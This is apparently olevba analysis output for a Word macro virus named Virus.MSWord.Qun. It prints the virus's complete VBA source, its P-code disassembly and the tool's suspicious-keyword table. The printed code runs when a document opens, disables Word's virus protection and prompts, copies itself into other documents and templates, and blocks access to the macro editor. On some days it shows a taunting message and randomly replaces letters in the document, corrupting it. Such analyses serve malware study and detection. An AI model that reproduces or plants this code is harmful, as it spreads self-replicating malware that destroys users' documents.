olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Qun
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Qun - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'<ThE YoUnG HaCkErZ>
On Error Resume Next
Mother = Options.DefaultFilePath(2) & "\~tmp.dot"
ChGCaP
    WordBasic.DisableAutoMacros True
    Options.VirusProtection = False
    Options.ConfirmConversions = False
    Options.SaveNormalPrompt = False
    For i = 1 To Documents.Count
    If Documents(i).NAME = ActiveDocument.NAME Then
    Set ThisDoc = Documents(i)
    Second ThisDoc
    End If
    Next
ShowMessage
    WordBasic.DisableAutoMacros False
ReSCaP
'wHeRe EvEr tHe FeAr mAy bE...LoOk iT iN tHe eYe...ThE PoWeR oF ViReX 2000
End Sub
Sub FileOpen()
'<ThE YoUnG HaCkErZ>
If Dialogs(80).Show <> 0 Then
  AutoOpen
End If
'tHis sPeaCiL ViReX iS DeSiGn tO U
'bY ThE YoUnG HaCkErZ OrG.
End Sub
Sub FlyMe(ThisAD)
On Error Resume Next
Mother = Options.DefaultFilePath(2) & "\~tmp.dot"
OriNormal = NormalTemplate.FullName
Set ThisDoc = ThisAD.VBProject.VBComponents.Item(2).CodeModule
With ThisDoc
  If .Lines(2, 1) <> "'<ThE YoUnG HaCkErZ>" Then
     ChGCaP
     With ThisAD
        .UpdateStylesOnOpen = False
        .AttachedTemplate = Mother
     End With
      Application.OrganizerCopy Source:=Mother, _
      Destination:=ThisAD, NAME:="Modulee", Object:=wdOrganizerObjectProjectItems
      'Application.DisplayRecentFiles = True
      Application.StatusBar = "Copying tHe YoUnG MeLLiNiUm HaCkErZ From " + ActiveDocument.NAME + _
      " to mY New cHiLd..."
    '  MsgBox ("Hi, World")
      With ThisAD
        .UpdateStylesOnOpen = False
        .AttachedTemplate = OriNormal
     End With
     ReSCaP
  End If
  ThisAD.Save
End With
'Application.OnTime Now + TimeValue("00:00:02"), "Module1.Hi"
 End Sub
Sub Second(ThisDoc)
On Error Resume Next
Dim ADMac As Object
Set AD = ThisDoc.VBProject.VBComponents.Item(1)
With ThisDoc.VBProject.VBComponents.Item(1).CodeModule
If .Lines(1, 1) <> "" Then
 ' MsgBox ("ClenAD, World")
  .DeleteLines 1, .CountOfLines
End If
End With
For Each ADMac In ThisDoc.VBProject.VBComponents
    If ADMac.NAME <> "ThisDocument" And _
    ADMac.NAME <> "Modulee" Then
         Application.OrganizerDelete ThisDoc.FullName, ADMac.NAME, 3
    End If
Next ADMac
FlyMe ThisDoc
End Sub
'*******************
Sub ToolsMacro()
    H = MsgBox("You can't create or modify macros.", vbExclamation + vbOKOnly)
End Sub
Sub ViewVBCode()
    ToolsMacro
End Sub
Sub FileTemplates()
    ToolsMacro
End Sub
Sub HelpAbout()
    H = MsgBox("Qun katawon walataqun kalaler." & Chr(13) & Chr(13) & _
    "I LOVE SOMETHING ERROR !", vbOKOnly + vbExclamation, "tHe YoUnG MeLLiNiUm HaCkErZ")
    OpenMyMacro
End Sub
Sub ToolsOptions()
    Options.SaveNormalPrompt = True
    Options.SavePropertiesPrompt = True
    Options.VirusProtection = True
    Dialogs(wdDialogToolsOptions).Show
    Options.SaveNormalPrompt = False
    Options.SavePropertiesPrompt = False
    Options.VirusProtection = False
End Sub
Sub ChGCaP()
    On Error Resume Next
    Application.Caption = "tHe YoUnG MeLLiNiUm HaCkErZ is now activating "
    ActiveWindow.Caption = "(i DoN't mEaN tO diStuRb, bUt i LuV iT)"
End Sub
Sub ReSCaP()
    On Error Resume Next
    Application.Caption = "Microsoft Word"
    ActiveWindow.Caption = ActiveDocument.NAME
End Sub
Sub OpenMyMacro()
    If InputBox("Enter password", "tHe YoUnG MeLLiNiUm HaCkErZ") = "vj" Then Application.ShowVisualBasicEditor = True
End Sub
Sub ShowMessage()
Dim NAME As String
Dim NewName As String
Dim MyName(7) As String
Dim FindTheName(10) As String
Dim Error As ErrObject
NAME = "a1Ab2Bc3Cd4De5Ef6Fg7Gh8Hi9Ij0Jk~Kl!LmMnNo$OpPq^Qr&RsStTuUv_VwWxXyYzZ"
 H = Time
 If (WeekDay(Date) = vbFriday Or WeekDay(Date) = vbSunday) And Time < TimeValue("21:00:00") Then
    For g = 1 To 9000
        Beep
    Next g
    H = MsgBox("Terimakasih buat dosenku yang amat sangat " & Chr(34) & _
    "bijaksana" & Chr(34) & "," & Chr(13) & "yang telah memberiku nilai JELEK. Saya merasa bangga " & Chr(13) & _
    "dan sungguh-sungguh bangga terhadap dosenku itu." & Chr(13) & _
    "Sekali lagi saya ucapkan terimakasih!." & Chr(13) & Chr(13) & "Semoga mereka tetap di STIKI." & _
    Chr(13) & "(buat teman-teman, ma'af mengganggu.)", vbOKOnly + vbExclamation, "Ucapan Terimakasih")
 '*******************
'***********************
For x = 1 To 29
'***********************
Dim NewHos As Object
On Error Resume Next
Again:
'ReplaceWith
NewName = ""
For i = 1 To 1
GenNewNo = Int(69 * Rnd + 1)
MyName(i) = Mid(NAME, GenNewNo, 1)
NewName = MyName(i)
Next i
ChGThiS = "AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz"
'FindAnDReplaceiT
FindName = ""
For y = 1 To 1
FindOldName = Int(52 * Rnd + 1)
FindTheName(b) = Mid(ChGThiS, FindOldName, 1)
Next y
    Selection.Find.ClearFormatting
    With Selection.Find
        .Text = FindTheName(b)
        .Replacement.Text = NewName
        .Forward = True
        .Wrap = wdFindContinue
        .Format = False
        .MatchCase = False
        .MatchWholeWord = False
        .MatchWildcards = False
        .MatchSoundsLike = False
        .MatchAllWordForms = False
    End With
    Selection.Find.Execute Replace:=wdReplaceAll
Next x
 End If
End Sub



-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Qun
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 10995 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	QuoteRem 0x0000 0x0013 "<ThE YoUnG HaCkErZ>"
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	LitDI2 0x0002 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitStr 0x0009 "\~tmp.dot"
' 	Concat 
' 	St Mother 
' Line #4:
' 	ArgsCall ChGCaP 0x0000 
' Line #5:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #7:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #8:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #9:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Documents 
' 	MemLd Count 
' 	For 
' Line #10:
' 	Ld i 
' 	ArgsLd Documents 0x0001 
' 	MemLd New 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Eq 
' 	IfBlock 
' Line #11:
' 	SetStmt 
' 	Ld i 
' 	ArgsLd Documents 0x0001 
' 	Set ThisDoc 
' Line #12:
' 	Ld ThisDoc 
' 	ArgsCall Second 0x0001 
' Line #13:
' 	EndIfBlock 
' Line #14:
' 	StartForVariable 
' 	Next 
' Line #15:
' 	ArgsCall ShowMessage 0x0000 
' Line #16:
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #17:
' 	ArgsCall ReSCaP 0x0000 
' Line #18:
' 	QuoteRem 0x0000 0x0049 "wHeRe EvEr tHe FeAr mAy bE...LoOk iT iN tHe eYe...ThE PoWeR oF ViReX 2000"
' Line #19:
' 	EndSub 
' Line #20:
' 	FuncDefn (Sub FileOpen())
' Line #21:
' 	QuoteRem 0x0000 0x0013 "<ThE YoUnG HaCkErZ>"
' Line #22:
' 	LitDI2 0x0050 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd Show 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #23:
' 	ArgsCall AutoOpen 0x0000 
' Line #24:
' 	EndIfBlock 
' Line #25:
' 	QuoteRem 0x0000 0x0021 "tHis sPeaCiL ViReX iS DeSiGn tO U"
' Line #26:
' 	QuoteRem 0x0000 0x0019 "bY ThE YoUnG HaCkErZ OrG."
' Line #27:
' 	EndSub 
' Line #28:
' 	FuncDefn (Sub FlyMe(ThisAD))
' Line #29:
' 	OnError (Resume Next) 
' Line #30:
' 	LitDI2 0x0002 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitStr 0x0009 "\~tmp.dot"
' 	Concat 
' 	St Mother 
' Line #31:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	St OriNormal 
' Line #32:
' 	SetStmt 
' 	LitDI2 0x0002 
' 	Ld ThisAD 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set ThisDoc 
' Line #33:
' 	StartWithExpr 
' 	Ld ThisDoc 
' 	With 
' Line #34:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	LitStr 0x0014 "'<ThE YoUnG HaCkErZ>"
' 	Ne 
' 	IfBlock 
' Line #35:
' 	ArgsCall ChGCaP 0x0000 
' Line #36:
' 	StartWithExpr 
' 	Ld ThisAD 
' 	With 
' Line #37:
' 	LitVarSpecial (False)
' 	MemStWith UpdateStylesOnOpen 
' Line #38:
' 	Ld Mother 
' 	MemStWith AttachedTemplate 
' Line #39:
' 	EndWith 
' Line #40:
' 	LineCont 0x0004 07 00 06 00
' 	Ld Mother 
' 	ParamNamed Source 
' 	Ld ThisAD 
' 	ParamNamed Destination 
' 	LitStr 0x0007 "Modulee"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #41:
' 	QuoteRem 0x0006 0x0025 "Application.DisplayRecentFiles = True"
' Line #42:
' 	LineCont 0x0004 0A 00 06 00
' 	LitStr 0x0029 "Copying tHe YoUnG MeLLiNiUm HaCkErZ From "
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Add 
' 	LitStr 0x0013 " to mY New cHiLd..."
' 	Add 
' 	Ld Application 
' 	MemSt StatusBar 
' Line #43:
' 	QuoteRem 0x0004 0x0016 "  MsgBox ("Hi, World")"
' Line #44:
' 	StartWithExpr 
' 	Ld ThisAD 
' 	With 
' Line #45:
' 	LitVarSpecial (False)
' 	MemStWith UpdateStylesOnOpen 
' Line #46:
' 	Ld OriNormal 
' 	MemStWith AttachedTemplate 
' Line #47:
' 	EndWith 
' Line #48:
' 	ArgsCall ReSCaP 0x0000 
' Line #49:
' 	EndIfBlock 
' Line #50:
' 	Ld ThisAD 
' 	ArgsMemCall Save 0x0000 
' Line #51:
' 	EndWith 
' Line #52:
' 	QuoteRem 0x0000 0x003C "Application.OnTime Now + TimeValue("00:00:02"), "Module1.Hi""
' Line #53:
' 	EndSub 
' Line #54:
' 	FuncDefn (Sub Second(ThisDoc))
' Line #55:
' 	OnError (Resume Next) 
' Line #56:
' 	Dim 
' 	VarDefn ADMac (As Object)
' Line #57:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ThisDoc 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set AD 
' Line #58:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld ThisDoc 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #59:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #60:
' 	QuoteRem 0x0001 0x0019 " MsgBox ("ClenAD, World")"
' Line #61:
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #62:
' 	EndIfBlock 
' Line #63:
' 	EndWith 
' Line #64:
' 	StartForVariable 
' 	Ld ADMac 
' 	EndForVariable 
' 	Ld ThisDoc 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #65:
' 	LineCont 0x0004 07 00 04 00
' 	Ld ADMac 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Ld ADMac 
' 	MemLd New 
' 	LitStr 0x0007 "Modulee"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #66:
' 	Ld ThisDoc 
' 	MemLd FullName 
' 	Ld ADMac 
' 	MemLd New 
' 	LitDI2 0x0003 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #67:
' 	EndIfBlock 
' Line #68:
' 	StartForVariable 
' 	Ld ADMac 
' 	EndForVariable 
' 	NextVar 
' Line #69:
' 	Ld ThisDoc 
' 	ArgsCall FlyMe 0x0001 
' Line #70:
' 	EndSub 
' Line #71:
' 	QuoteRem 0x0000 0x0013 "*******************"
' Line #72:
' 	FuncDefn (Sub ToolsMacro())
' Line #73:
' 	LitStr 0x0022 "You can't create or modify macros."
' 	Ld vbExclamation 
' 	Ld vbOKOnly 
' 	Add 
' 	ArgsLd MsgBox 0x0002 
' 	St H 
' Line #74:
' 	EndSub 
' Line #75:
' 	FuncDefn (Sub ViewVBCode())
' Line #76:
' 	ArgsCall ToolsMacro 0x0000 
' Line #77:
' 	EndSub 
' Line #78:
' 	FuncDefn (Sub FileTemplates())
' Line #79:
' 	ArgsCall ToolsMacro 0x0000 
' Line #80:
' 	EndSub 
' Line #81:
' 	FuncDefn (Sub HelpAbout())
' Line #82:
' 	LineCont 0x0004 10 00 04 00
' 	LitStr 0x001E "Qun katawon walataqun kalaler."
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0018 "I LOVE SOMETHING ERROR !"
' 	Concat 
' 	Ld vbOKOnly 
' 	Ld vbExclamation 
' 	Add 
' 	LitStr 0x001B "tHe YoUnG MeLLiNiUm HaCkErZ"
' 	ArgsLd MsgBox 0x0003 
' 	St H 
' Line #83:
' 	ArgsCall OpenMyMacro 0x0000 
' Line #84:
' 	EndSub 
' Line #85:
' 	FuncDefn (Sub ToolsOptions())
' Line #86:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #87:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt SavePropertiesPrompt 
' Line #88:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #89:
' 	Ld wdDialogToolsOptions 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #90:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #91:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SavePropertiesPrompt 
' Line #92:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #93:
' 	EndSub 
' Line #94:
' 	FuncDefn (Sub ChGCaP())
' Line #95:
' 	OnError (Resume Next) 
' Line #96:
' 	LitStr 0x002E "tHe YoUnG MeLLiNiUm HaCkErZ is now activating "
' 	Ld Application 
' 	MemSt Caption 
' Line #97:
' 	LitStr 0x0027 "(i DoN't mEaN tO diStuRb, bUt i LuV iT)"
' 	Ld ActiveWindow 
' 	MemSt Caption 
' Line #98:
' 	EndSub 
' Line #99:
' 	FuncDefn (Sub ReSCaP())
' Line #100:
' 	OnError (Resume Next) 
' Line #101:
' 	LitStr 0x000E "Microsoft Word"
' 	Ld Application 
' 	MemSt Caption 
' Line #102:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Ld ActiveWindow 
' 	MemSt Caption 
' Line #103:
' 	EndSub 
' Line #104:
' 	FuncDefn (Sub OpenMyMacro())
' Line #105:
' 	LitStr 0x000E "Enter password"
' 	LitStr 0x001B "tHe YoUnG MeLLiNiUm HaCkErZ"
' 	ArgsLd InputBox 0x0002 
' 	LitStr 0x0002 "vj"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' 	EndIf 
' Line #106:
' 	EndSub 
' Line #107:
' 	FuncDefn (Sub ShowMessage())
' Line #108:
' 	Dim 
' 	VarDefn New (As String)
' Line #109:
' 	Dim 
' 	VarDefn NewName (As String)
' Line #110:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x0007 
' 	VarDefn MyName (As String)
' Line #111:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x000A 
' 	VarDefn FindTheName (As String)
' Line #112:
' 	Dim 
' 	VarDefn Error (As ErrObject)
' Line #113:
' 	LitStr 0x0044 "a1Ab2Bc3Cd4De5Ef6Fg7Gh8Hi9Ij0Jk~Kl!LmMnNo$OpPq^Qr&RsStTuUv_VwWxXyYzZ"
' 	St New 
' Line #114:
' 	Ld Time 
' 	St H 
' Line #115:
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	Ld vbFriday 
' 	Eq 
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	Ld vbSunday 
' 	Eq 
' 	Or 
' 	Paren 
' 	Ld Time 
' 	LitStr 0x0008 "21:00:00"
' 	ArgsLd TimeValue 0x0001 
' 	Lt 
' 	And 
' 	IfBlock 
' Line #116:
' 	StartForVariable 
' 	Ld g 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x2328 
' 	For 
' Line #117:
' 	ArgsCall Beep 0x0000 
' Line #118:
' 	StartForVariable 
' 	Ld g 
' 	EndForVariable 
' 	NextVar 
' Line #119:
' 	LineCont 0x0010 0B 00 04 00 20 00 04 00 27 00 04 00 35 00 04 00
' 	LitStr 0x002A "Terimakasih buat dosenku yang amat sangat "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0009 "bijaksana"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 ","
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0035 "yang telah memberiku nilai JELEK. Saya merasa bangga "
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0030 "dan sungguh-sungguh bangga terhadap dosenku itu."
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0026 "Sekali lagi saya ucapkan terimakasih!."
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x001D "Semoga mereka tetap di STIKI."
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0025 "(buat teman-teman, ma'af mengganggu.)"
' 	Concat 
' 	Ld vbOKOnly 
' 	Ld vbExclamation 
' 	Add 
' 	LitStr 0x0012 "Ucapan Terimakasih"
' 	ArgsLd MsgBox 0x0003 
' 	St H 
' Line #120:
' 	QuoteRem 0x0001 0x0013 "*******************"
' Line #121:
' 	QuoteRem 0x0000 0x0017 "***********************"
' Line #122:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x001D 
' 	For 
' Line #123:
' 	QuoteRem 0x0000 0x0017 "***********************"
' Line #124:
' 	Dim 
' 	VarDefn NewHos (As Object)
' Line #125:
' 	OnError (Resume Next) 
' Line #126:
' 	Label Again 
' Line #127:
' 	QuoteRem 0x0000 0x000B "ReplaceWith"
' Line #128:
' 	LitStr 0x0000 ""
' 	St NewName 
' Line #129:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	For 
' Line #130:
' 	LitDI2 0x0045 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St GenNewNo 
' Line #131:
' 	Ld New 
' 	Ld GenNewNo 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Ld i 
' 	ArgsSt MyName 0x0001 
' Line #132:
' 	Ld i 
' 	ArgsLd MyName 0x0001 
' 	St NewName 
' Line #133:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #134:
' 	LitStr 0x0034 "AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz"
' 	St ChGThiS 
' Line #135:
' 	QuoteRem 0x0000 0x0010 "FindAnDReplaceiT"
' Line #136:
' 	LitStr 0x0000 ""
' 	St FindName 
' Line #137:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	For 
' Line #138:
' 	LitDI2 0x0034 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St FindOldName 
' Line #139:
' 	Ld ChGThiS 
' 	Ld FindOldName 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Ld B 
' 	ArgsSt FindTheName 0x0001 
' Line #140:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	NextVar 
' Line #141:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #142:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #143:
' 	Ld B 
' 	ArgsLd FindTheName 0x0001 
' 	MemStWith Then 
' Line #144:
' 	Ld NewName 
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #145:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #146:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #147:
' 	LitVarSpecial (False)
' 	MemStWith Format$ 
' Line #148:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #149:
' 	LitVarSpecial (False)
' 	MemStWith MatchWholeWord 
' Line #150:
' 	LitVarSpecial (False)
' 	MemStWith MatchWildcards 
' Line #151:
' 	LitVarSpecial (False)
' 	MemStWith MatchSoundsLike 
' Line #152:
' 	LitVarSpecial (False)
' 	MemStWith MatchAllWordForms 
' Line #153:
' 	EndWith 
' Line #154:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #155:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #156:
' 	EndIfBlock 
' Line #157:
' 	EndSub 
' Line #158:
' Line #159:
' Line #160:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|create              |May execute file or a system command through |
|          |                    |WMI                                          |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

